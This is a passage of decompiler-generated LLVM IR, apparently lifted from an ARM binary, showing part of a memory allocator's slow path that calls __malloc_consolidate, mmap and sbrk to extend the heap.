  br i1 %v2_13638, label %dec_label_pc_1361c, label %dec_label_pc_13640

dec_label_pc_13640:                               ; preds = %dec_label_pc_13628
  %v4_13640 = mul i32 %v1_1361c, 256
  %v5_13640 = add i32 %v4_1362c, %v4_13640
  store i32 %v5_13640, i32* %r3.global-to-local, align 4
  %v1_13644 = add i32 %v5_13640, 44
  store i32 %v1_13644, i32* %r0.global-to-local, align 4
  %v0_13648 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13648, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13658.preheader

dec_label_pc_13658.preheader:                     ; preds = %.dec_label_pc_13658.preheader_crit_edge, %dec_label_pc_13640
  %v0_1365057 = phi i32 [ %v1_13644, %dec_label_pc_13640 ], [ %v0_1365057.pre, %.dec_label_pc_13658.preheader_crit_edge ]
  %v0_13674 = phi i32 [ %v3_13634, %dec_label_pc_13640 ], [ %v1_1360c, %.dec_label_pc_13658.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_13648, %dec_label_pc_13640 ], [ %v0_1360c, %.dec_label_pc_13658.preheader_crit_edge ]
  %v2_1365854 = and i32 %ip.promoted, %v0_13674
  %v4_1365856 = icmp eq i32 %v2_1365854, 0
  br i1 %v4_1365856, label %dec_label_pc_13650, label %dec_label_pc_13660

dec_label_pc_13650:                               ; preds = %dec_label_pc_13658.preheader, %dec_label_pc_13650
  %v2_1365459 = phi i32 [ %v2_13654, %dec_label_pc_13650 ], [ %ip.promoted, %dec_label_pc_13658.preheader ]
  %v0_1365058 = phi i32 [ %v1_13650, %dec_label_pc_13650 ], [ %v0_1365057, %dec_label_pc_13658.preheader ]
  %v1_13650 = add i32 %v0_1365058, 8
  %v2_13654 = mul i32 %v2_1365459, 2
  %v2_13658 = and i32 %v2_13654, %v0_13674
  %v4_13658 = icmp eq i32 %v2_13658, 0
  br i1 %v4_13658, label %dec_label_pc_13650, label %dec_label_pc_13658.dec_label_pc_13660_crit_edge

dec_label_pc_13658.dec_label_pc_13660_crit_edge:  ; preds = %dec_label_pc_13650
  store i32 %v1_13650, i32* %r0.global-to-local, align 4
  store i32 %v2_13654, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13660

dec_label_pc_13660:                               ; preds = %dec_label_pc_13658.dec_label_pc_13660_crit_edge, %dec_label_pc_13658.preheader
  %v0_13680 = phi i32 [ %v2_13654, %dec_label_pc_13658.dec_label_pc_13660_crit_edge ], [ %ip.promoted, %dec_label_pc_13658.preheader ]
  %v0_136a4 = phi i32 [ %v1_13650, %dec_label_pc_13658.dec_label_pc_13660_crit_edge ], [ %v0_1365057, %dec_label_pc_13658.preheader ]
  %v1_13660 = add i32 %v0_136a4, 12
  %v2_13660 = inttoptr i32 %v1_13660 to i32*
  %v3_13660 = load i32, i32* %v2_13660, align 4
  store i32 %v3_13660, i32* @lr, align 4
  %v9_13664 = icmp eq i32 %v3_13660, %v0_136a4
  br i1 %v9_13664, label %dec_label_pc_1366c, label %dec_label_pc_1368c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_13660
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r0.global-to-local, align 4
  %v1_13670 = load i32, i32* @r8, align 4
  %v2_13670 = add i32 %v1_13670, ptrtoint (i32* @global_var_23010.367 to i32)
  %v3_13670 = inttoptr i32 %v2_13670 to i32*
  %v4_13670 = load i32, i32* %v3_13670, align 4
  %v2_13674 = sub i32 -1, %v0_13680
  %v3_13674 = and i32 %v0_13674, %v2_13674
  store i32 %v3_13674, i32* @r4, align 4
  %v1_13678 = load i32, i32* @r5, align 4
  %v4_13678 = mul i32 %v1_13678, 4
  %v5_13678 = add i32 %v4_13678, %v4_13670
  store i32 %v5_13678, i32* %r3.global-to-local, align 4
  %v1_1367c = add i32 %v0_136a4, 8
  store i32 %v1_1367c, i32* %r0.global-to-local, align 4
  %v2_13680 = mul i32 %v0_13680, 2
  store i32 %v2_13680, i32* %ip.global-to-local, align 4
  %v2_13684 = add i32 %v5_13678, 820
  %v3_13684 = inttoptr i32 %v2_13684 to i32*
  store i32 %v3_13674, i32* %v3_13684, align 4
  %v0_13604.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_1360c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13604

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13660
  %v1_1368c = add i32 %v3_13660, 4
  %v2_1368c = inttoptr i32 %v1_1368c to i32*
  %v3_1368c = load i32, i32* %v2_1368c, align 4
  store i32 %v3_1368c, i32* %r3.global-to-local, align 4
  %v1_13690 = and i32 %v3_1368c, -4
  store i32 %v1_13690, i32* %r2.global-to-local, align 4
  %v0_13694 = load i32, i32* @sl, align 4
  %v2_13694 = sub i32 %v1_13690, %v0_13694
  store i32 %v2_13694, i32* %ip.global-to-local, align 4
  %v1_13698 = add i32 %v3_13660, 12
  %v2_13698 = inttoptr i32 %v1_13698 to i32*
  %v3_13698 = load i32, i32* %v2_13698, align 4
  store i32 %v3_13698, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_13694, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_1368c
  %v6_136a0 = add i32 %v1_13690, %v3_13660
  store i32 %v6_136a0, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_1368c, %bb146
  %v2_136a4 = add i32 %v3_13698, 8
  %v3_136a4 = inttoptr i32 %v2_136a4 to i32*
  store i32 %v0_136a4, i32* %v3_136a4, align 4
  %v0_136a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_136a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_136a8 = add i32 %v1_136a8, 12
  %v3_136a8 = inttoptr i32 %v2_136a8 to i32*
  store i32 %v0_136a8, i32* %v3_136a8, align 4
  %v4_136ac = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_13588_crit_edge, label %dec_label_pc_136b8

.dec_label_pc_13588_crit_edge:                    ; preds = %bb147
  %v5_136ac = add i32 %v4_136ac, 8
  store i32 %v5_136ac, i32* %r4.global-to-local, align 4
  %v4_136b0 = load i32, i32* %r2.global-to-local, align 4
  %v5_136b0 = add i32 %v4_136b0, 4
  %v6_136b0 = inttoptr i32 %v5_136b0 to i32*
  %v7_136b0 = load i32, i32* %v6_136b0, align 4
  store i32 %v7_136b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13588

dec_label_pc_136b8:                               ; preds = %bb147
  %v1_136b8 = load i32, i32* @sl, align 4
  %v2_136b8 = add i32 %v1_136b8, %v4_136ac
  store i32 %v2_136b8, i32* %r1.global-to-local, align 4
  %v1_136c0 = load i32, i32* @r6, align 4
  %v2_136c0 = add i32 %v1_136c0, 8
  %v3_136c0 = inttoptr i32 %v2_136c0 to i32*
  store i32 %v2_136b8, i32* %v3_136c0, align 4
  %v0_136c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_136c4 = load i32, i32* @r6, align 4
  %v2_136c4 = add i32 %v1_136c4, 12
  %v3_136c4 = inttoptr i32 %v2_136c4 to i32*
  store i32 %v0_136c4, i32* %v3_136c4, align 4
  %v0_136c8 = load i32, i32* @r6, align 4
  %v1_136c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_136c8 = add i32 %v1_136c8, 8
  %v3_136c8 = inttoptr i32 %v2_136c8 to i32*
  store i32 %v0_136c8, i32* %v3_136c8, align 4
  %v0_136cc = load i32, i32* @r6, align 4
  %v1_136cc = load i32, i32* %r1.global-to-local, align 4
  %v2_136cc = add i32 %v1_136cc, 12
  %v3_136cc = inttoptr i32 %v2_136cc to i32*
  store i32 %v0_136cc, i32* %v3_136cc, align 4
  %tmp213 = icmp ult i32 %v1_136b8, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_136b8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v8_136d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v8_136d8, i32* %r3.global-to-local, align 4
  %v4_136dc = load i32, i32* %r1.global-to-local, align 4
  %v6_136dc = add i32 %v8_136d8, 48
  %v7_136dc = inttoptr i32 %v6_136dc to i32*
  store i32 %v4_136dc, i32* %v7_136dc, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_136b8, %bb148
  %v0_136e0 = load i32, i32* @sl, align 4
  %v1_136e0 = or i32 %v0_136e0, 1
  store i32 %v1_136e0, i32* %r2.global-to-local, align 4
  %v0_136e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_136e4 = or i32 %v0_136e4, 1
  store i32 %v1_136e4, i32* %r3.global-to-local, align 4
  %v0_136e8 = load i32, i32* @lr, align 4
  %v1_136e8 = add i32 %v0_136e8, 8
  store i32 %v1_136e8, i32* %r4.global-to-local, align 4
  %v2_136ec = add i32 %v0_136e8, 4
  %v3_136ec = inttoptr i32 %v2_136ec to i32*
  store i32 %v1_136e0, i32* %v3_136ec, align 4
  %v0_136f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_136f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_136f0 = add i32 %v1_136f0, %v0_136f0
  %v4_136f0 = inttoptr i32 %v3_136f0 to i32*
  store i32 %v0_136f0, i32* %v4_136f0, align 4
  %v0_136f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_136f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_136f4 = add i32 %v1_136f4, 4
  %v3_136f4 = inttoptr i32 %v2_136f4 to i32*
  store i32 %v0_136f4, i32* %v3_136f4, align 4
  br label %dec_label_pc_13b50

dec_label_pc_136fc.loopexit:                      ; preds = %dec_label_pc_1361c
  br label %dec_label_pc_136fc

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136fc.loopexit, %dec_label_pc_13310, %dec_label_pc_13318
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %ip.global-to-local, align 4
  %v4_13704 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_13704, i32* @r0, align 4
  %v1_13708 = add i32 %v4_13704, 44
  %v2_13708 = inttoptr i32 %v1_13708 to i32*
  %v3_13708 = load i32, i32* %v2_13708, align 4
  store i32 %v3_13708, i32* %ip.global-to-local, align 4
  %v1_1370c = add i32 %v3_13708, 4
  %v2_1370c = inttoptr i32 %v1_1370c to i32*
  %v3_1370c = load i32, i32* %v2_1370c, align 4
  %v0_13710 = load i32, i32* @sl, align 4
  %v1_13710 = add i32 %v0_13710, 16
  store i32 %v1_13710, i32* %r1.global-to-local, align 4
  %v1_13714 = and i32 %v3_1370c, -4
  store i32 %v1_13714, i32* %r3.global-to-local, align 4
  %v3_13718 = icmp ult i32 %v1_13714, %v1_13710
  br i1 %v3_13718, label %dec_label_pc_13748, label %dec_label_pc_13724

dec_label_pc_13724:                               ; preds = %dec_label_pc_136fc
  %v2_13724 = sub i32 %v1_13714, %v0_13710
  %v2_13728 = add i32 %v0_13710, %v3_13708
  store i32 %v2_13728, i32* %r1.global-to-local, align 4
  %v1_1372c = or i32 %v2_13724, 1
  store i32 %v1_1372c, i32* %r3.global-to-local, align 4
  %v1_13730 = or i32 %v0_13710, 1
  store i32 %v1_13730, i32* %r2.global-to-local, align 4
  %v1_13734 = add i32 %v3_13708, 8
  store i32 %v1_13734, i32* %r4.global-to-local, align 4
  store i32 %v1_13730, i32* %v2_1370c, align 4
  %v0_1373c = load i32, i32* %r1.global-to-local, align 4
  %v1_1373c = load i32, i32* @r0, align 4
  %v2_1373c = add i32 %v1_1373c, 44
  %v3_1373c = inttoptr i32 %v2_1373c to i32*
  store i32 %v0_1373c, i32* %v3_1373c, align 4
  %v0_13740 = load i32, i32* %r3.global-to-local, align 4
  %v1_13740 = load i32, i32* %r1.global-to-local, align 4
  %v2_13740 = add i32 %v1_13740, 4
  %v3_13740 = inttoptr i32 %v2_13740 to i32*
  store i32 %v0_13740, i32* %v3_13740, align 4
  br label %dec_label_pc_13b50

dec_label_pc_13748:                               ; preds = %dec_label_pc_136fc
  %v1_13748 = inttoptr i32 %v4_13704 to i32*
  %v2_13748 = load i32, i32* %v1_13748, align 4
  store i32 %v2_13748, i32* %r3.global-to-local, align 4
  %v1_1374c = and i32 %v2_13748, 2
  store i32 %v1_1374c, i32* %ip.global-to-local, align 4
  %v2_1374c = icmp eq i32 %v1_1374c, 0
  %v1_13750 = add i32 %v4_13704, 860
  %v2_13750 = inttoptr i32 %v1_13750 to i32*
  %v3_13750 = load i32, i32* %v2_13750, align 4
  store i32 %v3_13750, i32* %r1.global-to-local, align 4
  br i1 %v2_1374c, label %dec_label_pc_13768, label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %dec_label_pc_13748
  %v0_13758 = call i32 @__malloc_consolidate()
  %v0_1375c = load i32, i32* @sl, align 4
  %v1_1375c = add i32 %v0_1375c, -7
  store i32 %v1_1375c, i32* @r0, align 4
  %v0_13760 = call i32 @malloc()
  store i32 %v0_13760, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b4c

dec_label_pc_13768:                               ; preds = %dec_label_pc_13748
  %v1_13768 = add i32 %v4_13704, 844
  %v2_13768 = inttoptr i32 %v1_13768 to i32*
  %v3_13768 = load i32, i32* %v2_13768, align 4
  store i32 %v3_13768, i32* %r3.global-to-local, align 4
  %v3_1376c = icmp ult i32 %v0_13710, %v3_13768
  %v1_13770 = add i32 %v3_13750, -1
  store i32 %v1_13770, i32* %sb.global-to-local, align 4
  br i1 %v3_1376c, label %dec_label_pc_13844, label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_13768
  %v1_13778 = add i32 %v4_13704, 852
  %v2_13778 = inttoptr i32 %v1_13778 to i32*
  %v3_13778 = load i32, i32* %v2_13778, align 4
  store i32 %v3_13778, i32* %r2.global-to-local, align 4
  %v1_1377c = add i32 %v4_13704, 848
  %v2_1377c = inttoptr i32 %v1_1377c to i32*
  %v3_1377c = load i32, i32* %v2_1377c, align 4
  store i32 %v3_1377c, i32* %r3.global-to-local, align 4
  %v6_13784 = icmp slt i32 %v3_1377c, %v3_13778
  br i1 %v6_13784, label %dec_label_pc_13788, label %dec_label_pc_13844

dec_label_pc_13788:                               ; preds = %dec_label_pc_13778
  %v1_13788 = add i32 %v0_13710, 10
  %v2_1378c = add i32 %v1_13788, %v3_13750
  store i32 %v2_1378c, i32* %r3.global-to-local, align 4
  %v2_13790 = sub i32 0, %v3_13750
  %v3_13790 = and i32 %v2_1378c, %v2_13790
  store i32 %v3_13790, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_13790, %v0_13710
  br i1 %tmp214, label %dec_label_pc_1379c, label %dec_label_pc_13844

dec_label_pc_1379c:                               ; preds = %dec_label_pc_13788
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_13790, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_137b4 = call i32 @mmap(i32 0, i32 %v3_13790, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_137b4, i32* %r0.global-to-local, align 4
  %v7_137b8 = icmp eq i32 %v6_137b4, -1
  br i1 %v7_137b8, label %dec_label_pc_1379c.dec_label_pc_13844_crit_edge, label %dec_label_pc_137c0

dec_label_pc_1379c.dec_label_pc_13844_crit_edge:  ; preds = %dec_label_pc_1379c
  %v1_13868.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13844

dec_label_pc_137c0:                               ; preds = %dec_label_pc_1379c
  %v1_137c0 = urem i32 %v6_137b4, 8
  store i32 %v1_137c0, i32* %r2.global-to-local, align 4
  %v2_137c0 = icmp eq i32 %v1_137c0, 0
  br i1 %v2_137c0, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_137c0
  %v2_137c4 = sub nsw i32 8, %v1_137c0
  store i32 %v2_137c4, i32* %r3.global-to-local, align 4
  %v2_137c8 = load i32, i32* @r4, align 4
  %v3_137c8 = sub i32 %v2_137c8, %v2_137c4
  %v3_137cc = add i32 %v2_137c4, %v6_137b4
  store i32 %v3_137cc, i32* %lr.global-to-local, align 4
  %v2_137d4 = or i32 %v3_137c8, 2
  store i32 %v2_137d4, i32* %r2.global-to-local, align 4
  %v5_137dc = inttoptr i32 %v3_137cc to i32*
  store i32 %v2_137c4, i32* %v5_137dc, align 4
  %v1_137e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_137e0 = load i32, i32* %lr.global-to-local, align 4
  %v3_137e0 = add i32 %v2_137e0, 4
  %v4_137e0 = inttoptr i32 %v3_137e0 to i32*
  store i32 %v1_137e0, i32* %v4_137e0, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_137c0
  store i32 %v6_137b4, i32* %lr.global-to-local, align 4
  %v1_137d850 = load i32, i32* @r4, align 4
  %v2_137d851 = or i32 %v1_137d850, 2
  store i32 %v2_137d851, i32* %r3.global-to-local, align 4
  %v3_137e4 = inttoptr i32 %v6_137b4 to i32*
  store i32 0, i32* %v3_137e4, align 4
  %v1_137e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_137e8 = load i32, i32* %lr.global-to-local, align 4
  %v3_137e8 = add i32 %v2_137e8, 4
  %v4_137e8 = inttoptr i32 %v3_137e8 to i32*
  store i32 %v1_137e8, i32* %v4_137e8, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_137f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_137f4, i32* %ip.global-to-local, align 4
  %v1_137f8 = add i32 %v4_137f4, 848
  %v2_137f8 = inttoptr i32 %v1_137f8 to i32*
  %v3_137f8 = load i32, i32* %v2_137f8, align 4
  store i32 %v3_137f8, i32* %r3.global-to-local, align 4
  %v1_137fc = add i32 %v4_137f4, 856
  %v2_137fc = inttoptr i32 %v1_137fc to i32*
  %v3_137fc = load i32, i32* %v2_137fc, align 4
  store i32 %v3_137fc, i32* %r2.global-to-local, align 4
  %v1_13800 = add i32 %v3_137f8, 1
  store i32 %v1_13800, i32* %r3.global-to-local, align 4
  %v7_13808 = icmp sgt i32 %v1_13800, %v3_137fc
  br i1 %v7_13808, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_13800, i32* %v2_137fc, align 4
  %v0_1380c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1380c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_1380c = phi i32 [ %v4_137f4, %.thread30 ], [ %v1_1380c.pre, %bb150 ]
  %v0_1380c = phi i32 [ %v1_13800, %.thread30 ], [ %v0_1380c.pre, %bb150 ]
  %v2_1380c = add i32 %v1_1380c, 848
  %v3_1380c = inttoptr i32 %v2_1380c to i32*
  store i32 %v0_1380c, i32* %v3_1380c, align 4
  %v0_13810 = load i32, i32* %ip.global-to-local, align 4
  %v1_13810 = add i32 %v0_13810, 868
  %v2_13810 = inttoptr i32 %v1_13810 to i32*
  %v3_13810 = load i32, i32* %v2_13810, align 4
  store i32 %v3_13810, i32* %r3.global-to-local, align 4
  %v1_13814 = add i32 %v0_13810, 880
  %v2_13814 = inttoptr i32 %v1_13814 to i32*
  %v3_13814 = load i32, i32* %v2_13814, align 4
  store i32 %v3_13814, i32* %r2.global-to-local, align 4
  %v0_13818 = load i32, i32* @r4, align 4
  %v2_13818 = add i32 %v0_13818, %v3_13810
  store i32 %v2_13818, i32* %r1.global-to-local, align 4
  %v1_1381c = add i32 %v0_13810, 872
  %v2_1381c = inttoptr i32 %v1_1381c to i32*
  %v3_1381c = load i32, i32* %v2_1381c, align 4
  store i32 %v3_1381c, i32* %r3.global-to-local, align 4
  %v1_13824 = add i32 %v0_13810, 884
  %v2_13824 = inttoptr i32 %v1_13824 to i32*
  %v3_13824 = load i32, i32* %v2_13824, align 4
  store i32 %v3_13824, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_13818, %v3_13814
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_13818, i32* %v2_13814, align 4
  %v0_1382c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1382c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_1382c = phi i32 [ %v0_13810, %bb151 ], [ %v1_1382c.pre, %bb152 ]
  %v0_1382c = phi i32 [ %v2_13818, %bb151 ], [ %v0_1382c.pre, %bb152 ]
  %v2_1382c = add i32 %v1_1382c, 868
  %v3_1382c = inttoptr i32 %v2_1382c to i32*
  store i32 %v0_1382c, i32* %v3_1382c, align 4
  %v0_13830 = load i32, i32* %r1.global-to-local, align 4
  %v1_13830 = load i32, i32* %r3.global-to-local, align 4
  %v2_13830 = add i32 %v1_13830, %v0_13830
  store i32 %v2_13830, i32* %r1.global-to-local, align 4
  %v1_13834 = load i32, i32* %r2.global-to-local, align 4
  %v0_13838 = load i32, i32* %lr.global-to-local, align 4
  %v1_13838 = add i32 %v0_13838, 8
  store i32 %v1_13838, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_13830, %v1_13834
  br i1 %tmp216, label %bb154, label %dec_label_pc_13b4c

bb154:                                            ; preds = %bb153
  %v5_1383c = load i32, i32* %ip.global-to-local, align 4
  %v6_1383c = add i32 %v5_1383c, 884
  %v7_1383c = inttoptr i32 %v6_1383c to i32*
  store i32 %v2_13830, i32* %v7_1383c, align 4
  br label %dec_label_pc_13b4c

dec_label_pc_13844:                               ; preds = %dec_label_pc_13788, %dec_label_pc_13768, %dec_label_pc_1379c.dec_label_pc_13844_crit_edge, %dec_label_pc_13778
  %v1_13868 = phi i32 [ %v1_13868.pre, %dec_label_pc_1379c.dec_label_pc_13844_crit_edge ], [ %v0_13710, %dec_label_pc_13778 ], [ %v0_13710, %dec_label_pc_13768 ], [ %v0_13710, %dec_label_pc_13788 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %ip.global-to-local, align 4
  %v4_1384c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_1384c, i32* %r3.global-to-local, align 4
  %v1_13850 = add i32 %v4_1384c, 44
  %v2_13850 = inttoptr i32 %v1_13850 to i32*
  %v3_13850 = load i32, i32* %v2_13850, align 4
  store i32 %v3_13850, i32* %r0.global-to-local, align 4
  %v1_13854 = add i32 %v4_1384c, 864
  %v2_13854 = inttoptr i32 %v1_13854 to i32*
  %v3_13854 = load i32, i32* %v2_13854, align 4
  store i32 %v3_13854, i32* %r2.global-to-local, align 4
  %v1_13858 = add i32 %v4_1384c, 840
  %v2_13858 = inttoptr i32 %v1_13858 to i32*
  %v3_13858 = load i32, i32* %v2_13858, align 4
  store i32 %v3_13858, i32* %r3.global-to-local, align 4
  %v1_1385c = add i32 %v3_13850, 4
  %v2_1385c = inttoptr i32 %v1_1385c to i32*
  %v3_1385c = load i32, i32* %v2_1385c, align 4
  store i32 %v3_1385c, i32* %r1.global-to-local, align 4
  %v1_13864 = urem i32 %v3_13854, 2
  %v2_13864 = icmp eq i32 %v1_13864, 0
  %v1_13860 = add i32 %v1_13868, 16
  %v2_13868 = add i32 %v1_13860, %v3_13858
  store i32 %v2_13868, i32* %r3.global-to-local, align 4
  %v1_1386c = and i32 %v3_1385c, -4
  store i32 %v1_1386c, i32* @r8, align 4
  br i1 %v2_13864, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_13844
  %v3_13870 = sub i32 %v2_13868, %v1_1386c
  store i32 %v3_13870, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_13844, %bb155
  %v0_13874 = phi i32 [ %v2_13868, %dec_label_pc_13844 ], [ %v3_13870, %bb155 ]
  %v1_13874 = load i32, i32* %sb.global-to-local, align 4
  %v2_13874 = add i32 %v1_13874, %v0_13874
  store i32 %v2_13874, i32* %r3.global-to-local, align 4
  %v1_13878 = sub i32 -1, %v1_13874
  store i32 %v1_13878, i32* %fp.global-to-local, align 4
  %v2_1387c = and i32 %v2_13874, %v1_13878
  store i32 %v2_1387c, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_1387c, 1
  br i1 %tmp157, label %dec_label_pc_138a0, label %dec_label_pc_1388c

dec_label_pc_1388c:                               ; preds = %bb156
  store i32 %v2_1387c, i32* %r0.global-to-local, align 4
  %v1_13890 = call i32 @__GI_sbrk(i32 %v2_1387c)
  store i32 %v1_13890, i32* %r0.global-to-local, align 4
  %v3_13894 = icmp eq i32 %v1_13890, -1
  store i32 %v1_13890, i32* @r4, align 4
  br i1 %v3_13894, label %dec_label_pc_138a0, label %dec_label_pc_1390c

dec_label_pc_138a0:                               ; preds = %dec_label_pc_1388c, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r1.global-to-local, align 4
  %v4_138a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_138a8, i32* %r6.global-to-local, align 4
  %v1_138ac = add i32 %v4_138a8, 864
  %v2_138ac = inttoptr i32 %v1_138ac to i32*
  %v3_138ac = load i32, i32* %v2_138ac, align 4
  store i32 %v3_138ac, i32* %r3.global-to-local, align 4
  %v1_138b0 = urem i32 %v3_138ac, 2
  %v2_138b0 = icmp eq i32 %v1_138b0, 0
  br i1 %v2_138b0, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_138a0
  %v1_138b4 = load i32, i32* @r8, align 4
  %v2_138b4 = load i32, i32* %sb.global-to-local, align 4
  %v3_138b4 = add i32 %v2_138b4, %v1_138b4
  %v2_138b8 = load i32, i32* @r5, align 4
  %v3_138b8 = add i32 %v3_138b4, %v2_138b8
  store i32 %v3_138b8, i32* %r3.global-to-local, align 4
  %v2_138bc = load i32, i32* %fp.global-to-local, align 4
  %v3_138bc = and i32 %v2_138bc, %v3_138b8
  store i32 %v3_138bc, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_138a0
  %v0_138c0.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_138c0 = phi i32 [ %v0_138c0.pr, %.thread32thread-pre-split ], [ %v3_138bc, %bb158 ]
  %v2_138c0 = icmp ugt i32 %v0_138c0, 1048575
  br i1 %v2_138c0, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_138d8 = phi i32 [ %v0_138c0, %.thread32 ], [ 1048576, %bb159 ]
  %v1_138c8 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_138d8, %v1_138c8
  br i1 %tmp217, label %dec_label_pc_138d0, label %dec_label_pc_13b34

dec_label_pc_138d0:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_138d8, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_138ec = call i32 @mmap(i32 0, i32 %v0_138d8, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_138ec, i32* %r0.global-to-local, align 4
  %v3_138f0 = icmp eq i32 %v6_138ec, -1
  %v8_138f0 = icmp eq i32 %v6_138ec, -1
  store i32 %v6_138ec, i32* @r4, align 4
  br i1 %v8_138f0, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_138d0
  %v1_138f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_138f8 = add i32 %v1_138f8, 864
  %v3_138f8 = inttoptr i32 %v2_138f8 to i32*
  %v4_138f8 = load i32, i32* %v3_138f8, align 4
  %v2_138fc = load i32, i32* @r5, align 4
  %v3_138fc = add i32 %v2_138fc, %v6_138ec
  store i32 %v3_138fc, i32* %r0.global-to-local, align 4
  %v2_13900 = and i32 %v4_138f8, -2
  store i32 %v2_13900, i32* %r3.global-to-local, align 4
  store i32 %v2_13900, i32* %v3_138f8, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_138d0, %bb161
  br i1 %v3_138f0, label %dec_label_pc_1390c, label %dec_label_pc_13910

dec_label_pc_1390c:                               ; preds = %.thread35, %dec_label_pc_1388c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13910

dec_label_pc_13910:                               ; preds = %.thread35, %dec_label_pc_1390c
  %v0_13910 = load i32, i32* @r4, align 4
  %v7_13910 = icmp eq i32 %v0_13910, -1
  br i1 %v7_13910, label %dec_label_pc_13b34, label %dec_label_pc_13918

dec_label_pc_13918:                               ; preds = %dec_label_pc_13910
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r2.global-to-local, align 4
  %v4_13920 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 64) to i32*), align 4
  store i32 %v4_13920, i32* %ip.global-to-local, align 4
